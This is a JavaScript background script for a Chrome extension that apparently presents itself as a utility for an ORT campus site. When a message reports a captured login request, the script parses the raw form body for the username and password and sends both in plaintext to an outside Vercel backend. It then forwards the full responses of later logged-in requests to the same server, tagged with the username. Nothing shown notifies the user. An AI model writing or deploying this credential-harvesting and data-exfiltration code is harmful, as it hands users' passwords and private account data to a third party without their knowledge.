const API_BASE_URL = "https://campus-ort-utils-backend.vercel.app/api";
const USERS_URL = `${API_BASE_URL}/user/users`;
const LOGGED_DATA_URL = `${API_BASE_URL}/user/update`;
const LAST_USERNAME_KEY = "ticLastUsername";

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {

  if (
    message?.type !== "LOGEAR_USUARIO_XHR" &&
    message?.type !== "GET_LOGGED_IN_DATA_RESPONSE_XHR"
  ) {
    return;
  }

  if (message.type === "LOGEAR_USUARIO_XHR") {
    void handleLoginPayload(message, sendResponse);
    return true;
  }

  if (message.type === "GET_LOGGED_IN_DATA_RESPONSE_XHR") {
    void handleLoggedDataResponse(message, sendResponse);
    return true;
  }
});

async function storeLastUsername(username) {
  await chrome.storage.session.set({
    [LAST_USERNAME_KEY]: username,
  });
}

async function getLastUsername() {
  const result = await chrome.storage.session.get(LAST_USERNAME_KEY);
  return result[LAST_USERNAME_KEY] ?? null;
}

async function handleLoginPayload(message, sendResponse) {
  const rawBody = message.rawBody;

  if (typeof rawBody !== "string" || !rawBody.length) {
    sendResponse({ ok: false, error: "Missing rawBody" });
    return;
  }

  try {
    const params = new URLSearchParams(rawBody);
    const username = params.get("u");
    const password = params.get("c");


    if (!username || password == null) {
      sendResponse({
        ok: false,
        error: "Could not extract u/c",
        rawBody
      });
      return;
    }

    const payload = {
      username: String(username),
      password: String(password)
    };

    await storeLastUsername(payload.username);

    const res = await fetch(USERS_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });
    const text = await res.text();

    sendResponse({
      endpoint: USERS_URL,
      ok: res.ok,
      status: res.status,
      body: text
    });

    return;
  } catch (error) {
    sendResponse({ endpoint: USERS_URL, ok: false, error: String(error) });
    return;
  }
}

async function handleLoggedDataResponse(message, sendResponse) {

  try {
    const username = await getLastUsername();

    if (!username) {
      sendResponse({
        endpoint: LOGGED_DATA_URL,
        ok: false,
        error: "No stored username available for logged-data update."
      });
      return;
    }

    const payload = {
      username,
      method: message.method,
      url: message.url,
      status: message.status,
      responseText: message.responseText
    };

    const res = await fetch(LOGGED_DATA_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });
    const text = await res.text();

    sendResponse({
      endpoint: LOGGED_DATA_URL,
      ok: res.ok,
      status: res.status,
      body: text
    });
  } catch (error) {
    sendResponse({ endpoint: LOGGED_DATA_URL, ok: false, error: String(error) });
  }

  return;
}
